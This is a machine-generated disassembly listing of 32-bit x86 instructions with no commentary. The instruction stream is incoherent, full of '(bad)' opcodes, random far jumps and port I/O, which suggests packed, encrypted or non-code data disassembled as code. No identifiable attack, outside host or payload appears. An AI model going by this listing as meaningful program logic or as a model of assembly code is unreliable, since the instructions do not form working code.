  407708:	push   0x77968dae
  40770d:	adc    eax,0x15f495a5
  407712:	mov    al,ds:0xb7d81ea2
  407717:	xchg   edx,eax
  407718:	xchg   edi,eax
  407719:	cdq    
  40771a:	inc    DWORD PTR [ecx-0x74]
  40771d:	fucomi st,st(0)
  40771f:	mov    ebp,eax
  407721:	push   0xffffffb5
  407723:	mov    al,0x12
  407725:	(bad)  
  407726:	pop    esi
  407727:	pushf  
  407728:	icebp  
  407729:	jge    0x407720
  40772b:	lods   al,BYTE PTR ds:[esi]
  40772c:	pop    es
  40772d:	jns    0x407778
  40772f:	lods   al,BYTE PTR ds:[esi]
  407730:	inc    DWORD PTR [ecx+0x42]
  407733:	int3   
  407734:	test   BYTE PTR [ecx],dl
  407736:	and    al,BYTE PTR [esi+0x4acac542]
  40773c:	add    al,0xd1
  40773e:	jl     0x407795
  407740:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407741:	out    0xea,eax
  407743:	retf   
  407744:	mov    ch,0x91
  407746:	adc    BYTE PTR [ecx+0x59],ch
  407749:	xchg   edi,eax
  40774a:	jne    0x40772a
  40774c:	in     eax,0xc4
  40774e:	rcr    DWORD PTR [eax],0x84
  407751:	fcomp  DWORD PTR [ecx+0x7e3576dc]
  407757:	popa   
  407758:	xchg   ebp,eax
  407759:	cmp    edi,DWORD PTR [ebp-0x5866c5ad]
  40775f:	js     0x4077bb
  407761:	xchg   DWORD PTR [esi+eax*2+0x773db175],eax
  407768:	push   eax
  407769:	enterw 0x4378,0x8c
  40776e:	loopne 0x4077e3
  407770:	dec    ecx
  407771:	mov    ds:0xc72f6d11,eax
  407776:	jp     0x407725
  407778:	dec    edx
  407779:	ss pop edi
  40777b:	push   es
  40777c:	push   0x0
  40777e:	cmp    ecx,esi
  407780:	pusha  
  407781:	fidivr WORD PTR [ebx]
  407783:	pop    esi
  407784:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407785:	cmp    ecx,DWORD PTR [eax]
  407787:	ror    BYTE PTR [ecx-0x42],0xc2
  40778b:	add    al,0xf4
  40778d:	inc    edi
  40778e:	scas   al,BYTE PTR es:[edi]
  40778f:	inc    ecx
  407790:	rcr    DWORD PTR [esi-0x2776e097],0x19
  407797:	cmp    edx,DWORD PTR [edx-0x78bec9ed]
  40779d:	pushf  
  40779e:	ret    0x6fc9
  4077a1:	cdq    
  4077a2:	adc    ebx,ebx
  4077a4:	push   eax
  4077a5:	out    0x98,eax
  4077a7:	(bad)  
  4077a8:	xchg   ebx,eax
  4077a9:	jmp    0x407760
  4077ab:	mov    cl,0x1b
  4077ad:	dec    esp
  4077ae:	sti    
  4077af:	inc    esi
  4077b0:	fwait
  4077b1:	pop    esi
  4077b2:	push   cs
  4077b3:	push   eax
  4077b4:	cli    
  4077b5:	push   ebx
  4077b6:	mov    edx,ebp
  4077b8:	mul    DWORD PTR [ecx]
  4077ba:	jmp    0xca9e:0x30029c41
  4077c1:	loop   0x407758
  4077c3:	jge    0x407819
  4077c5:	jo     0x40781a
  4077c7:	jnp    0x4077bb
  4077c9:	push   es
  4077ca:	clc    
  4077cb:	mov    edx,0x7ca1529a
  4077d0:	in     al,dx
  4077d1:	jae    0x40781e
  4077d3:	mov    dh,0x57
  4077d5:	test   al,0x86
  4077d7:	call   DWORD PTR [eax]
  4077d9:	pop    eax
  4077da:	fstp   TBYTE PTR ds:0xd72310d2
  4077e0:	out    dx,al
  4077e1:	outs   dx,BYTE PTR ds:[esi]
  4077e2:	jmp    0xeae32dbf
  4077e7:	xor    al,0xe3
  4077e9:	add    al,0x74
  4077eb:	pop    ds
  4077ec:	sub    DWORD PTR ds:0x58b7e890,ecx
  4077f2:	inc    ebx
  4077f3:	(bad)  [ecx-0x1e538569]
  4077f9:	xor    DWORD PTR [edx-0x50],0x53193743
  407800:	or     eax,0xe549d848
  407805:	mov    eax,0xf2c96097
  40780a:	in     al,dx
  40780b:	test   BYTE PTR [ebp-0x5],0x87
  40780f:	jl     0x4077fe
  407811:	jl     0x4077ae
  407813:	shr    DWORD PTR [ebp+eiz*4-0x2c6fe913],0x41
  40781b:	and    al,0xff
  40781d:	mov    dl,0xc
  40781f:	add    ecx,DWORD PTR [eax+0x73]
  407822:	or     BYTE PTR [edi],bl
  407824:	sbb    eax,0xac02d0a6
  407829:	pop    esp
  40782a:	inc    edx
  40782b:	mov    esi,0xcf026cd9
  407830:	sahf   
  407831:	mov    DWORD PTR [esi-0x671891bf],esp
  407837:	div    BYTE PTR ds:0xba13b6eb
  40783d:	mov    esp,0xbc8c30c4
  407842:	jge    0x407857
  407844:	sbb    BYTE PTR [edx],bh
  407846:	clc    
  407847:	retf   
  407848:	ins    BYTE PTR es:[edi],dx
  407849:	(bad)  
  40784a:	lahf   
  40784b:	or     DWORD PTR [eax-0x33418a27],0x15
  407852:	or     eax,0xaff7d37b
  407857:	out    dx,eax
  407858:	or     cl,BYTE PTR [ebx-0x35be5802]
  40785e:	sbb    BYTE PTR [edi],ch
  407860:	ins    BYTE PTR es:[edi],dx
  407861:	add    ch,0x68
  407864:	ins    DWORD PTR es:[edi],dx
  407865:	jg     0x407887
  407867:	js     0x40785f
  407869:	pushf  
  40786a:	xchg   edx,eax
  40786b:	shr    DWORD PTR [edi+edi*8],1
  40786e:	cmc    
  40786f:	pop    edx
  407870:	jecxz  0x407840
  407872:	cmp    ecx,0xea9d17d
  407878:	ret    
  407879:	or     BYTE PTR [ebx+0x80e4bf],al
  40787f:	xor    eax,0xaeef8f94
  407884:	lahf   
  407885:	cmp    BYTE PTR [eax],cl
  407887:	jg     0x40788a
  407889:	inc    esp
  40788a:	call   0x5bc6:0x3783af77
  407891:	push   ss
  407892:	popa   
  407893:	or     BYTE PTR [eax+0xc],0x13
  407897:	sub    bl,BYTE PTR [ebp-0x66]
  40789a:	dec    DWORD PTR [esi+0x29408614]
  4078a0:	add    edx,DWORD PTR [esi+0x45]
  4078a3:	dec    ecx
  4078a4:	les    esp,FWORD PTR [esi]
  4078a6:	repnz stos BYTE PTR es:[edi],al
  4078a8:	pop    ebp
  4078a9:	adc    ah,BYTE PTR [eax+0xe]
  4078ac:	mov    ch,0xec
  4078ae:	push   0x18aea351
  4078b3:	xor    al,0xee
  4078b5:	mov    dl,0x55
  4078b7:	add    eax,ecx
  4078b9:	mov    al,0x79
  4078bb:	sub    edi,eax
  4078bd:	xor    bh,cl
  4078bf:	loopne 0x40785a
  4078c1:	retf   
  4078c2:	inc    ecx
  4078c3:	sub    eax,0x406ddd3e
  4078c8:	dec    edi
  4078c9:	mov    WORD PTR [edx-0x27],ss
  4078cc:	int3   
  4078cd:	sti    
  4078ce:	ins    BYTE PTR es:[edi],dx
  4078cf:	cmp    al,0x4c
  4078d1:	sub    ah,ch
  4078d3:	push   eax
  4078d4:	imul   ebx,DWORD PTR [edi+0x75],0x41ea3b10
  4078db:	call   0xbeba1c16
  4078e0:	and    BYTE PTR [esi],0x92
  4078e3:	gs or  eax,0x273f7a67
  4078e9:	xchg   ebp,eax
  4078ea:	sub    DWORD PTR [esi+0x32],0xffffffc3
  4078ee:	xchg   esi,eax
  4078ef:	int    0xd0
  4078f1:	add    BYTE PTR [ebp-0x48c277d9],ah
  4078f7:	mov    BYTE PTR [ebx],ah
  4078f9:	test   bl,dl
  4078fb:	cmp    DWORD PTR [edi],edx
  4078fd:	lahf   
  4078fe:	ret    0x9a6
  407901:	pop    ds
  407902:	xchg   ecx,eax
  407903:	jnp    0x40793e
  407905:	mov    cl,0x46
  407907:	jp     0x407954
  407909:	mov    dh,0x2f
  40790b:	adc    esi,0x5e
  40790e:	ja     0x4078a2
  407910:	mov    eax,ds:0x38ce7301
  407915:	jmp    FWORD PTR cs:[ebp+0x45c6602c]
  40791c:	shr    DWORD PTR [edi],cl
  40791e:	lea    eax,[edx]
  407920:	stos   BYTE PTR es:[edi],al
  407921:	dec    eax
  407922:	push   cs
  407923:	inc    eax
  407924:	cwde   
  407925:	push   ds
  407926:	cmp    eax,0xddd89022
  40792b:	lods   eax,DWORD PTR ds:[esi]
  40792c:	repz sub BYTE PTR [ebx-0x7ab701ad],0x39
  407934:	push   edx
  407935:	jmp    0xb28f8ba0
  40793a:	retf   
  40793b:	inc    ecx
  40793c:	dec    esi
  40793d:	jg     0x4079b2
  40793f:	ins    BYTE PTR es:[edi],dx
  407940:	fild   WORD PTR [edx+0x1d]
  407943:	inc    ebx
  407944:	and    cl,bl
  407946:	fxch   st(7)
  407948:	rcr    BYTE PTR [ebx],1
  40794a:	xor    al,cl
  40794c:	or     esp,edi
  40794e:	lods   eax,DWORD PTR ds:[esi]
  40794f:	add    ch,BYTE PTR [ebp+esi*4+0x73]
  407953:	jmp    0xdf5cd6f4
  407958:	adc    al,0xbe
  40795a:	sbb    dl,0x7f
  40795d:	push   ecx
  40795e:	out    dx,eax
  40795f:	idiv   BYTE PTR [edi-0x6d]
  407962:	inc    edi
  407963:	lea    eax,[esi]
  407965:	inc    edx
  407966:	stos   DWORD PTR es:[edi],eax
  407967:	sub    ecx,DWORD PTR [edi+0x33]
  40796a:	les    esi,FWORD PTR [ebx]
  40796c:	or     al,0x8b
  40796e:	fadd   QWORD PTR [eax]
  407970:	lds    esi,FWORD PTR [eax]
  407972:	ja     0x40794a
  407974:	cmp    ch,dl
  407976:	mov    edx,0x75107a08
  40797b:	in     al,0xad
  40797d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40797e:	mov    BYTE PTR [ecx],ah
  407980:	out    dx,al
  407981:	and    BYTE PTR [edx],ah
  407983:	leave  
  407984:	or     bl,ah
  407986:	ret    0x308e
  407989:	jno    0x407938
  40798b:	add    al,0xb8
  40798d:	mov    eax,0xf16efc8
  407992:	hlt    
  407993:	outs   dx,BYTE PTR ds:[esi]
  407994:	add    eax,0x76fce6f2
  407999:	sub    cl,BYTE PTR [eax+ebp*4+0x54bd2321]
  4079a0:	mov    eax,ds:0xbd8870d1
  4079a5:	fld    TBYTE PTR [ebp-0x604ca2ea]
  4079ab:	int3   
  4079ac:	cmp    eax,0xc4b36db9
  4079b1:	add    eax,0x517803df
  4079b6:	sti    
  4079b7:	xchg   BYTE PTR [ebx+0x384bc727],cl
  4079bd:	sbb    BYTE PTR [eax-0x64033b1],ah
  4079c3:	mov    al,0xcd
  4079c5:	xor    eax,0xf2df457e
  4079ca:	jp     0x4079c6
  4079cc:	jae    0x4079da
  4079ce:	mov    BYTE PTR [esi-0x6527cb75],bh
  4079d4:	jge    0x4079fd
  4079d6:	gs cmp esi,esi
  4079d9:	call   edi
  4079db:	sbb    cl,ch
  4079dd:	push   ebp
  4079de:	sbb    esi,DWORD PTR [edx+0x992e2d2]
  4079e4:	retf   0x1b2d
  4079e7:	mov    ebp,eax
  4079e9:	inc    eax
  4079ea:	mov    eax,ds:0x2b5efef0
  4079ef:	push   ds
  4079f0:	push   ds
  4079f1:	retf   0x36e0
  4079f4:	lahf   
  4079f5:	jmp    0x3bb7ba1f
  4079fa:	jg     0x407983
  4079fc:	sub    al,BYTE PTR [ecx]
  4079fe:	out    0x78,al
  407a00:	sub    ecx,DWORD PTR [ebx+0x5a538651]
  407a06:	mov    dl,BYTE PTR ds:0x3cb70ef2
  407a0c:	ins    BYTE PTR es:[edi],dx
  407a0d:	xchg   BYTE PTR [ebp-0x537ff672],bh
  407a13:	js     0x407a30
  407a15:	data16 (bad) 
  407a17:	shld   DWORD PTR [ebx-0x36baaa6b],edi,0x50
  407a1f:	dec    edi
  407a20:	mov    al,ds:0xd8110846
  407a25:	cmp    BYTE PTR [eax+eax*2],0xb9
  407a29:	xchg   edi,eax
  407a2a:	pop    es
  407a2b:	sbb    eax,0xe4463236
  407a30:	stos   DWORD PTR es:[edi],eax
  407a31:	mov    DWORD PTR [ebx],eax
  407a33:	(bad)  
  407a34:	int    0x1a
  407a36:	sub    al,0xd1
  407a38:	inc    edx
  407a39:	push   edi
  407a3a:	or     bl,BYTE PTR [ecx]
  407a3c:	lock adc eax,0xb61c1916
  407a42:	adc    al,0x55
  407a44:	sub    ebp,DWORD PTR [ecx-0x55a95dfc]
  407a4a:	xor    al,0x4c
  407a4c:	xchg   esi,eax
  407a4d:	push   esi
  407a4e:	jge    0x4079da
  407a50:	xchg   ecx,eax
  407a51:	sub    bh,BYTE PTR [edi+0x1eb38ab6]
  407a57:	mov    ss,WORD PTR [edx-0x60]
  407a5a:	js     0x407a23
  407a5c:	sbb    edi,ebp
  407a5e:	pop    edx
  407a5f:	pusha  
  407a60:	sahf   
  407a61:	mov    ds:0xbf5413b9,eax
  407a66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a67:	sar    BYTE PTR [eax],1
  407a69:	jbe    0x407a0e
  407a6b:	iret   
  407a6c:	ror    BYTE PTR [ebx],cl
  407a6e:	pop    ecx
  407a6f:	or     BYTE PTR [edi-0x9],dh
  407a72:	cmp    ebx,DWORD PTR [ebx+eiz*4]
  407a75:	rol    DWORD PTR [ebp+0x0],cl
  407a78:	ds lahf 
  407a7a:	mov    esp,0x108084f3
  407a7f:	xor    eax,0x2fe64211
  407a84:	lods   al,BYTE PTR ds:[esi]
  407a85:	out    0xe,eax
  407a87:	aad    0xc5
  407a89:	jg     0x407ae1
  407a8b:	clc    
  407a8c:	lods   eax,DWORD PTR gs:[esi]
  407a8e:	xor    BYTE PTR ds:0xc79f478e,bl
  407a94:	mov    ecx,0x3dc68c54
  407a99:	jle    0x407abf
  407a9b:	push   esi
  407a9c:	stos   BYTE PTR es:[edi],al
  407a9d:	dec    edx
  407a9e:	pop    ss
  407a9f:	or     dl,al
  407aa1:	jmp    0x407a9d
  407aa3:	xor    BYTE PTR [ebp+0x3c8e5d22],bh
  407aa9:	push   esp
  407aaa:	aas    
  407aab:	sbb    eax,0xb83211ed
  407ab0:	loopne 0x407adc
  407ab2:	cmp    BYTE PTR [ebx],0xd1
  407ab5:	mov    ds:0x4fadc494,al
  407aba:	retf   0x6fd0
  407abd:	adc    eax,0x745cc390
  407ac2:	hlt    
  407ac3:	push   ecx
  407ac4:	stos   DWORD PTR es:[edi],eax
  407ac5:	dec    esi
  407ac6:	dec    edi
  407ac7:	loop   0x407a5d
  407ac9:	scas   al,BYTE PTR es:[edi]
  407aca:	adc    DWORD PTR [ecx],0xffffffdc
  407acd:	dec    ecx
  407ace:	jecxz  0x407b11
  407ad0:	jbe    0x407b0b
  407ad2:	inc    ecx
  407ad3:	(bad)  
  407ad4:	mov    edi,0xfc30f279
  407ad9:	xor    al,0x5a
  407adb:	sbb    dh,BYTE PTR [edi+0x2fe74e86]
  407ae1:	xor    eax,edi
  407ae3:	mov    ch,0x78
  407ae5:	jmp    0x407a74
  407ae7:	sti    
  407ae8:	adc    ah,BYTE PTR [ecx]
  407aea:	cld    
  407aeb:	call   0x86d1:0x4af0c0f8
  407af2:	psubq  mm7,mm4
  407af5:	xor    DWORD PTR [eax+0x40],0xfffffff1
  407af9:	rcl    BYTE PTR [ebp-0x3a],cl
  407afc:	sub    BYTE PTR [ebp+0x79689859],bl
  407b02:	xchg   edx,eax
  407b03:	push   0xffffffd6
  407b05:	or     DWORD PTR [edx],edi
  407b07:	in     al,dx
  407b08:	jae    0x407aa4
  407b0a:	dec    esp
  407b0b:	fldcw  WORD PTR [edi-0x7e605b4f]
  407b11:	ss push esi
  407b13:	mov    BYTE PTR [edx+edi*2-0x1f],cl
  407b17:	ret    0x36e1
  407b1a:	dec    ecx
  407b1b:	aas    
  407b1c:	jo     0x407afb
  407b1e:	scas   eax,DWORD PTR es:[edi]
  407b1f:	fldcw  WORD PTR [edi+0x18]
  407b22:	sub    ebx,DWORD PTR [edx]
  407b24:	repz dec ebp
  407b26:	push   es
  407b27:	test   esi,0xaf9f7452
  407b2d:	nop
  407b2e:	mov    edx,0xc4634602
  407b33:	leave  
  407b34:	into   
  407b35:	and    BYTE PTR [esi-0x1e4aca48],bh
  407b3b:	push   ds
  407b3c:	clc    
  407b3d:	jmp    0xa7c:0xd9f99e82
  407b44:	ja     0x407b89
  407b46:	jae    0x407ae8
  407b48:	sbb    BYTE PTR [ebx+esi*2+0x6d],dl
  407b4c:	push   es
  407b4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b4e:	mov    ds:0x9515471e,eax
  407b53:	(bad)  
  407b54:	mov    dl,0xb3
  407b56:	xor    ecx,esi
  407b58:	xor    BYTE PTR [ebp-0x5467479b],dh
  407b5e:	pop    ss
  407b5f:	(bad)
  407b63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b64:	addr16 in al,dx
  407b66:	add    ecx,DWORD PTR [ecx-0x689fca13]
  407b6c:	out    dx,al
  407b6d:	or     DWORD PTR [ecx],ebp
  407b6f:	jo     0x407b55
  407b71:	jmp    FWORD PTR [ebx]
  407b73:	sbb    edi,ebx
  407b75:	fstp   DWORD PTR [ebp+ecx*2+0x3b]
  407b79:	inc    esp
  407b7a:	and    eax,0x638073e2
  407b7f:	(bad)  [edx+0x3f]
  407b82:	xchg   BYTE PTR [eax+0x381a4f8a],dh
  407b88:	add    al,0x61
  407b8a:	adc    al,0xb3
  407b8c:	jns    0x407c01
  407b8e:	(bad)  
  407b8f:	ret    
  407b90:	push   edi
  407b91:	adc    al,0x5b
  407b93:	pop    ecx
  407b94:	push   0xab6756f6
  407b99:	loop   0x407bbe
  407b9b:	daa    
  407b9c:	push   esp
  407b9d:	sbb    DWORD PTR [esi],eax
  407b9f:	push   esp
  407ba0:	jle    0x407bf8
  407ba2:	test   eax,0xfc9dab67
  407ba7:	adc    DWORD PTR ds:0xeffc83da,esi
  407bad:	mov    dl,0xdf
  407baf:	or     bh,BYTE PTR [ecx]
  407bb1:	sar    DWORD PTR [edi+0x32],1
  407bb4:	int    0xb4
  407bb6:	adc    ebp,edi
  407bb8:	push   0x7
  407bba:	test   al,0xb3
  407bbc:	out    0xc7,eax
  407bbe:	retf   0x599d
  407bc1:	dec    ecx
  407bc2:	(bad)  
  407bc4:	retf   0x1ebd
  407bc7:	data16 lahf 
  407bc9:	test   edi,esp
  407bcb:	or     BYTE PTR [eax],0xb1
  407bce:	mov    esi,0x8bde8670
  407bd3:	mov    ebp,0xf694e85f
  407bd8:	(bad)  
  407bda:	xchg   BYTE PTR [esi+esi*4-0x76],bl
  407bde:	das    
  407bdf:	cmp    BYTE PTR [ebp+eiz*8-0x15994ee3],0x53
  407be7:	mov    ds:0x6ef6858d,eax
  407bec:	mov    WORD PTR [ebx+eax*2-0x5a],ds
  407bf0:	pop    eax
  407bf1:	cli    
  407bf2:	push   edi
  407bf3:	aam    0x9c
  407bf5:	mov    esi,0x37c234a0
  407bfa:	fsubr  DWORD PTR [edi]
  407bfc:	or     DWORD PTR [ecx-0x43],0x4559ba32
  407c03:	jo     0x407c58
  407c05:	mov    al,bl
  407c07:	shl    dl,cl
  407c09:	stc    
  407c0a:	mov    al,0x78
  407c0c:	js     0x407bc3
  407c0e:	out    dx,eax
  407c0f:	popf   
  407c10:	adc    DWORD PTR [esp+ecx*1-0x7a63e800],0xcbee8574
  407c1b:	adc    BYTE PTR [ebx+0x1e],0x6c
  407c1f:	dec    ebp
  407c20:	sub    BYTE PTR [ebp+0x76d35dfe],cl
  407c26:	push   eax
  407c27:	ficomp DWORD PTR [esi-0x8]
  407c2a:	test   al,0x4e
  407c2c:	cmp    dl,BYTE PTR [esi+ebp*2-0x7f6849a3]
  407c33:	mov    bl,0xba
  407c35:	(bad)  
  407c36:	sub    eax,0x24733d69
  407c3b:	call   0x254261b5
  407c40:	sbb    ebx,edx
  407c42:	xchg   esi,eax
  407c43:	iret   
  407c44:	cwde   
  407c45:	lods   eax,DWORD PTR ds:[esi]
  407c46:	and    eax,0x108b27a
  407c4b:	adc    eax,0x72c248f7
  407c50:	adc    BYTE PTR [edi-0x4f],bh
  407c53:	dec    esi
  407c54:	push   ebp
  407c55:	fchs   
  407c57:	and    bl,BYTE PTR [edx+0x4f]
  407c5a:	repz add al,0xd0
  407c5d:	ror    DWORD PTR [ebp+0x8e2dc2e],0x4f
  407c64:	clc    
  407c65:	push   ss
  407c66:	out    dx,eax
  407c67:	jmp    0x3d92:0x5dd9f00e
  407c6e:	lods   eax,DWORD PTR ds:[esi]
  407c6f:	xor    ah,0xf3
  407c72:	and    cl,BYTE PTR [eax]
  407c74:	push   es
  407c75:	fwait
  407c76:	ins    DWORD PTR es:[edi],dx
  407c77:	aaa    
  407c78:	jnp    0x407c8e
  407c7a:	out    0xac,al
  407c7c:	sbb    dl,BYTE PTR [edx+0x64]
  407c7f:	daa    
  407c80:	or     ecx,DWORD PTR [ebx]
  407c82:	mov    ch,0x25
  407c84:	jbe    0x407c75
  407c86:	xchg   esp,eax
  407c87:	pushf  
  407c88:	xor    al,0x69
  407c8a:	cmp    edx,DWORD PTR [edx+0x44]
  407c8d:	scas   eax,DWORD PTR es:[edi]
  407c8e:	mov    WORD PTR [esi-0x396ac314],?
  407c94:	popf   
  407c95:	(bad)  
  407c96:	jecxz  0x407c4c
  407c98:	gs in  al,0x8d
  407c9b:	test   BYTE PTR [edx+ecx*8-0x75],cl
  407c9f:	or     eax,0x5aaa6a29
  407ca4:	xchg   esp,eax
  407ca5:	mov    ah,0x8
  407ca7:	in     eax,dx
  407ca8:	mov    eax,es:0x5a681c58
  407cae:	mov    ch,0xae
  407cb0:	adc    BYTE PTR [ebp+0x15],al
  407cb3:	xor    DWORD PTR [eax-0x28be899a],eax
  407cb9:	fadd   QWORD PTR [ecx+0x46a8c939]
  407cbf:	aad    0x99
  407cc1:	push   ss
  407cc2:	(bad)  
  407cc3:	fnsave [esi+eiz*8+0x4f7287b2]
  407cca:	js     0x407c61
  407ccc:	jbe    0x407cee
  407cce:	mov    ebp,0x56098880
  407cd3:	mov    DWORD PTR [ebx+ebp*2+0x554978c1],edx
  407cda:	(bad)  
  407cdb:	push   ss
  407cdc:	(bad)  
  407cde:	sbb    eax,0xcaf7fdcd
  407ce3:	jg     0x407d41
  407ce5:	repnz in eax,dx
  407ce7:	push   0xf
  407ce9:	retf   0x457
  407cec:	jmp    0xc20:0xa4c0d674
  407cf3:	lock xor bh,ah
  407cf6:	bound  eax,QWORD PTR [ebp+ebx*1+0x6b091a47]
  407cfd:	adc    eax,0xb83c08ed
  407d02:	adc    ebx,DWORD PTR [ebp-0x71]
  407d05:	fiadd  WORD PTR [ecx+0x67a32fbb]
  407d0b:	lahf   
  407d0c:	and    eax,0x66ea0627
  407d11:	hlt    
  407d12:	inc    eax
  407d13:	or     esp,ebp
  407d15:	repnz push es
  407d17:	sbb    cl,BYTE PTR [edi+0x63eabb14]
  407d1d:	dec    eax
  407d1e:	pusha  
  407d1f:	sbb    cl,ah
  407d21:	es aas 
  407d23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d24:	(bad)  
  407d25:	leave  
  407d26:	sbb    al,0xe7
  407d28:	push   edi
  407d29:	ret    
  407d2a:	push   esi
  407d2b:	jo     0x407d2c
  407d2d:	or     ebp,DWORD PTR [ecx]
  407d2f:	lods   eax,DWORD PTR ds:[esi]
  407d30:	(bad)  
  407d31:	in     al,dx
  407d32:	test   DWORD PTR [eax-0x7515cc7b],edx
  407d38:	test   BYTE PTR [edx+eax*2],al
  407d3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d3c:	xchg   esi,eax
  407d3d:	sahf   
  407d3e:	pushf  
  407d3f:	push   eax
  407d40:	sbb    eax,0xe5b6a0ff
  407d45:	das    
  407d46:	and    esi,DWORD PTR [esi-0x51e43080]
  407d4c:	xor    edi,DWORD PTR [ebx]
  407d4e:	xchg   ebp,eax
  407d4f:	pop    ds
  407d50:	imul   ecx,DWORD PTR [ecx+0x455fbfb3],0xfffffff1
  407d57:	imul   ebp,DWORD PTR [esi],0xfffffffd
  407d5a:	das    
  407d5b:	leave  
  407d5c:	fwait
  407d5d:	xor    al,0xfc
  407d5f:	js     0x407d15
  407d61:	ins    DWORD PTR es:[edi],dx
  407d62:	pop    ebp
  407d63:	scas   al,BYTE PTR es:[edi]
  407d64:	pop    ss
  407d65:	pop    edi
  407d66:	and    BYTE PTR [esp-0x10c7d7d0],ch
  407d6d:	jae    0x407de8
  407d6f:	pop    esp
  407d70:	mov    DWORD PTR [ebx+edi*2+0x7f280ed],edx
  407d77:	rcr    DWORD PTR [edi+0x74],cl
  407d7a:	add    dl,BYTE PTR [ebx-0x2117daee]
  407d80:	xor    al,0xf7
  407d82:	aaa    
  407d83:	fadd   DWORD PTR [ecx+0x48]
  407d86:	sub    esi,DWORD PTR [esi+0x70]
  407d89:	push   0x55
  407d8b:	jg     0x407d31
  407d8d:	push   cs
  407d8e:	(bad)  
  407d8f:	repz cwde 
  407d91:	icebp  
  407d92:	or     eax,0x370c8206
  407d97:	inc    esi
  407d98:	ss or  al,0x9f
  407d9b:	jg     0x407de4
  407d9d:	and    ecx,DWORD PTR [ecx+ecx*4]
  407da0:	inc    ebx
  407da1:	call   0x5c031637
  407da6:	call   0xe5bf3b50
  407dab:	ror    bh,1
  407dad:	les    ecx,FWORD PTR [edi]
  407daf:	inc    edi
  407db0:	ss daa 
  407db2:	js     0x407dcc
  407db4:	add    ebx,0x17
  407db7:	xor    edx,DWORD PTR [edi-0x3]
  407dba:	inc    edi
  407dbb:	fisubr DWORD PTR [eax-0x3dee7883]
  407dc1:	not    DWORD PTR [ebp+ebx*2+0x6c]
  407dc5:	mov    WORD PTR [edi],gs
  407dc7:	loop   0x407df9
  407dc9:	dec    ecx
  407dca:	stc    
  407dcb:	inc    ebx
  407dcc:	in     al,dx
  407dcd:	fimul  WORD PTR [ecx]
  407dcf:	hlt    
  407dd0:	les    di,DWORD PTR [esi-0x14]
  407dd4:	shl    BYTE PTR [edx],cl
  407dd6:	ins    BYTE PTR es:[edi],dx
  407dd7:	push   ebp
  407dd8:	or     BYTE PTR [ecx+0x64],ch
  407ddb:	enter  0x75ed,0x57
  407ddf:	xchg   ebx,eax
  407de0:	popf   
  407de1:	cld    
  407de2:	and    esp,DWORD PTR [eax-0x14]
  407de5:	mov    bh,0x2d
  407de7:	mov    ecx,0x4fa6d2fc
  407dec:	shl    ch,0xef
  407def:	fstp   QWORD PTR [eax-0x70]
  407df2:	and    DWORD PTR [edi],edx
  407df4:	sub    eax,0xa8a75352
  407df9:	iret   
  407dfa:	adc    eax,0xe97975e
  407dff:	cmp    esp,ecx
  407e01:	out    0x2e,eax
  407e03:	enter  0x89d7,0xb
  407e07:	aas    
  407e08:	test   eax,0xc8fa5800
  407e0d:	xchg   edx,eax
  407e0e:	push   edx
  407e0f:	xor    DWORD PTR [ebx],ebx
  407e11:	mov    ebx,0xfd2973c
  407e16:	fdecstp 
  407e18:	sub    BYTE PTR [edx],bh
  407e1a:	sbb    DWORD PTR [edi+0x59],0x7b
  407e1e:	lahf   
  407e1f:	test   eax,0xa2e3240e
  407e24:	out    dx,al
  407e25:	adc    al,0xec
  407e27:	push   ebx
  407e28:	add    eax,0x970a1d56
  407e2d:	inc    eax
  407e2e:	jo     0x407e56
  407e30:	mov    ebx,0xcd4ea316
  407e35:	dec    ebp
  407e36:	stos   DWORD PTR es:[edi],eax
  407e37:	jbe    0x407db9
  407e39:	pop    ebp
  407e3a:	xor    al,0x79
  407e3c:	sub    al,0x1a
  407e3e:	xchg   ecx,eax
  407e3f:	mov    ah,0x50
  407e41:	sub    dh,BYTE PTR ds:0x61f7b57b
  407e47:	rcl    DWORD PTR [eax-0x6b],1
  407e4a:	sbb    al,0x2e
  407e4c:	dec    ebx
  407e4d:	inc    ebp
  407e4e:	dec    edi
  407e4f:	push   es
  407e50:	sbb    BYTE PTR [esi+0x3e060244],dl
  407e56:	sub    ah,BYTE PTR [ecx-0x33e2f3d9]
  407e5c:	push   ebp
  407e5d:	lock push ebp
  407e5f:	cmp    al,0xca
  407e61:	cmp    edi,DWORD PTR [edi-0x5e04f701]
  407e67:	xchg   ebx,eax
  407e68:	cli    
  407e69:	loop   0x407eb9
  407e6b:	xchg   BYTE PTR [ecx+0x323d4a68],dh
  407e71:	adc    eax,0x88f8c35e
  407e76:	ss aas 
  407e78:	adc    DWORD PTR [eax],esi
  407e7a:	mov    ?,WORD PTR [ebx+ebp*8-0x17f7942c]
  407e81:	test   DWORD PTR [ebp-0x7ea9f81],edi
  407e87:	out    0x16,eax
  407e89:	in     eax,0xca
  407e8b:	aaa    
  407e8c:	push   0xac642c67
  407e91:	mov    cl,0x8e
  407e93:	ror    esi,cl
  407e95:	dec    esi
  407e96:	shl    esi,1
  407e98:	adc    al,0x12
  407e9a:	out    0xdf,al
  407e9c:	das    
  407e9d:	imul   ebp,DWORD PTR [ecx-0x67],0x74
  407ea1:	sbb    DWORD PTR [ebp+0x5b],0x79
  407ea5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ea6:	out    0xc5,eax
  407ea8:	push   0x22
  407eaa:	pop    ebp
  407eab:	push   ebp
  407eac:	data16 int 0x73
  407eaf:	(bad)  
  407eb0:	retf   0xeac7
  407eb3:	xor    cl,BYTE PTR [esi+esi*1-0x67a2566f]
  407eba:	inc    ebx
  407ebb:	in     al,dx
  407ebc:	nop
  407ebd:	jp     0x407e54
  407ebf:	jge    0x407ed3
  407ec1:	cmp    edi,DWORD PTR [edx+0x9]
  407ec4:	and    bl,BYTE PTR [ecx]
  407ec6:	icebp  
  407ec7:	es sub al,0xa4
  407eca:	das    
  407ecb:	sbb    eax,0x764d9971
  407ed0:	xchg   edx,eax
  407ed1:	inc    edx
  407ed2:	data16 cmp al,0x96
  407ed5:	out    dx,al
  407ed6:	cld    
  407ed7:	push   edi
  407ed8:	fist   DWORD PTR [ebp+0x46]
  407edb:	loop   0x407efa
